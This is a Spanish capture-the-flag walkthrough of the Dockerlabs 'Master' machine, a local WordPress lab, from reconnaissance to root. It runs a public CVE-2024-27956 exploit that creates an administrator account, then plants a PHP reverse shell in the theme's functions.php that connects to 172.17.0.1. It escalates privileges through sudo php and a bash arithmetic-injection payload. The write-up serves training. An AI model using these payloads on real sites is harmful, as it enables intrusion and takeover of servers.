
# Writeup Template: Maquina `[ Master ]`

- Tags: #Master
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Master](https://mega.nz/file/4b1TQSTC#In5DpkgPX9cJgCHCrEc9WpccX5YdF2GPyFy7XXs_Gg4)
## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x master.zip
sudo bash auto_deploy.sh master.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t [IP_TARGET] -p [Rango_Puertos]

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn [IP_TARGET] -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p[Puertos_Abiertos] [IP_TARGET] -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal] `CMS WordPress`
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/

http://172.17.0.2/ [200 OK] Apache[2.4.58], Bootstrap[3.3.25], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], JQuery[3.7.1], MetaGenerator[Elementor 3.22.3; features: e_optimized_assets_loading, e_optimized_css_loading, e_font_icon_svg, additional_custom_breakpoints, e_optimized_control_loading, e_lazyload; settings: css_print_method-external, google_font-enabled, font_display-swap,WordPress 6.8.1], Open-Graph-Protocol[website], PasswordField[register_user_password,register_user_password_re,user_password], Script[speculationrules,text/javascript], Title[Master], UncommonHeaders[link], WordPress[6.8.1]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/wp-login.php: Possible admin folder
/readme.html: Wordpress version: 2 
/: WordPress version: 6.8.1
/wp-includes/images/rss.png: Wordpress version 2.2 found.
/wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
/wp-includes/images/blank.gif: Wordpress version 2.6 found.
/wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
/wp-login.php: Wordpress login page.
/wp-admin/upgrade.php: Wordpress login page.
/readme.html: Interesting, a readme.
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/wp-content/          (Status: 200) [Size: 0]
/wp-includes/         (Status: 200) [Size: 60613]
/wp-admin/            (Status: 302) [Size: 0] [--> http://172.17.0.2/wp-login.php?redirect_to=http%3A%2F%2F172.17.0.2%2Fwp-admin%2F&reauth=1]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,py
```

- **Hallazgos**:
```bash
/wp-content           (Status: 301) [Size: 313] [--> http://172.17.0.2/wp-content/]
/index.php            (Status: 301) [Size: 0] [--> http://172.17.0.2/]
/wp-login.php         (Status: 200) [Size: 5851]
/license.txt          (Status: 200) [Size: 19903]
/wp-includes          (Status: 301) [Size: 314] [--> http://172.17.0.2/wp-includes/]
/readme.html          (Status: 200) [Size: 7425]
/wp-admin             (Status: 301) [Size: 311] [--> http://172.17.0.2/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://172.17.0.2/wp-login.php?action=register]
```

### Enumeracion WordPress:
```bash
wpscan --url http://172.17.0.2 --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```

No reporta nada critico pero si revisamos el pie de pagina **footer** tenemos lo siguiente:
```bash
Created by Master 2024 && Automated By wp-automatic 3.92.0
```

## Explotacion de Vulnerabilidades
Investigando por la version usaremos este exploit en pythhon [exploit.py](https://github.com/diego-tella/CVE-2024-27956-RCE) para creamos un usuario administrador en el sistema:
Nos clonamos el repositorio:
```bash
git clone https://github.com/diego-tella/CVE-2024-27956-RCE/
```

### Vector de Ataque
Despues e meternos a la carptela lo vamos a ejeuctar: Pasandole la url objetivio
```bash
python3 exploit.py http://172.17.0.2/
```
### Ejecucion del Ataque
Ahora tenemos un nuevo usuario administrador:
```bash
[+] Exploit for CVE-2024-27956
[+] Creating user eviladmin
[+] Giving eviladmin administrator permissions
[+] Exploit completed!
[+] administrator created: eviladmin:admin
```

Ahora con estas credenciales nos podemos conectar como administradores:
```bash
username: eviladmin
password: admin
```

Ahora nos iremos al apartado de **Appearance**
```bash
http://172.17.0.2/wp-admin/themes.php
```

Ahora entramos a **Thema File Editor**
```bash
http://172.17.0.2/wp-admin/theme-editor.php
```

Ahora estando en **funcions.php** inyectaremos una revershell de **php**:
### Intrusion
```bash
nc -nlvp 443
```

Ahora inyectamos este codigo en el archivo **funcions.php**
```bash
$sock=fsockopen("172.17.0.1",443);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
```

Asi quedareia el archivo final:
```php
# Reverse shell o acceso inicial
<?php
$sock=fsockopen("172.17.0.1",443);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
/**
 * Theme functions and definitions.
 * This child theme was generated by Merlin WP.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 */

/*
 * If your child theme has more than one .css file (eg. ie.css, style.css, main.css) then
 * you will have to make sure to maintain all of the parent theme dependencies.
 *
 * Make sure you're using the correct handle for loading the parent theme's styles.
 * Failure to use the proper tag will result in a CSS file needlessly being loaded twice.
 * This will usually not affect the site appearance, but it's inefficient and extends your page's loading time.
 *
 * @link https://codex.wordpress.org/Child_Themes
 */
function mslmsstartertheme_child_enqueue_styles() {
    wp_enqueue_style( 'ms-lms-starter-theme-style' , get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'ms-lms-starter-theme-child-style',
        get_stylesheet_directory_uri() . '/style.css',
        array( 'ms-lms-starter-theme-style' ),
        wp_get_theme()->get('Version')
    );
}

add_action(  'wp_enqueue_scripts', 'mslmsstartertheme_child_enqueue_styles' );
```


---

## Escalada de Privilegios

###### Usuario `[ www-data ]`:
Listanod los permisos para este usuario:
```bash
sudo -l 

User www-data may run the following commands on e0f03ecc5baa:
    (pylon) NOPASSWD: /usr/bin/php # Tenemnos una via potencial de migrar a este usuario.
```

Explotamos el privilegio
```bash
# Comando para escalar al usuario: ( Pylon )
sudo -u pylon /usr/bin/php -r "system('/bin/bash');"
```
###### Usuario `[ Pylon ]`:
Para este usuario tenemos el siguiente archivo: **pylonsorpresita.sh** que si revisamos su contenido:
```bash
#!/bin/bash

read -rp "Escribe 1 para ver el canal de pylon: " num

if [[ $num -eq 1 ]]
then    
  echo "https://www.youtube.com/@Pylonet"
else    
  echo "Ingresa el 1"
fi
```

Revisando los permisos del usuario este archivo se puede ejecutar como el usuario: **mario**
```bash
User pylon may run the following commands on e0f03ecc5baa:
    (mario) NOPASSWD: /bin/bash /home/mario/pingusorpresita.sh
```

Para explotar este privilegio le inyectaremos un comanod al programa al ejecutarlo:
```bash
sudo -u mario /bin/bash /home/mario/pingusorpresita.sh
```

Ahora le inyectamos el comando:
```bash
Escribe 1 para ver el canal del pinguino, o cualquier otro numero para acceder a la academia: a[$(/bin/bash >&2)]+42
```
###### Usuario `[ Mario ]`:
Listando los permisos para este usuario tenemos lo siguiente:
```bash
sudo -l

User mario may run the following commands on e0f03ecc5baa:
    (root) NOPASSWD: /bin/bash /home/pylon/pylonsorpresita.sh
```

Ahora tenemos el mismo archivo pero como root:
```bash
sudo -u root /bin/bash /home/pylon/pylonsorpresita.sh
```

Ahora explotamos el privilegio para ganar acceso como **root**
```bash
Escribe 1 para ver el canal de pylon: a[$(/bin/bash >&2)]+42
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@e0f03ecc5baa:/home/mario# whoami
root
```

---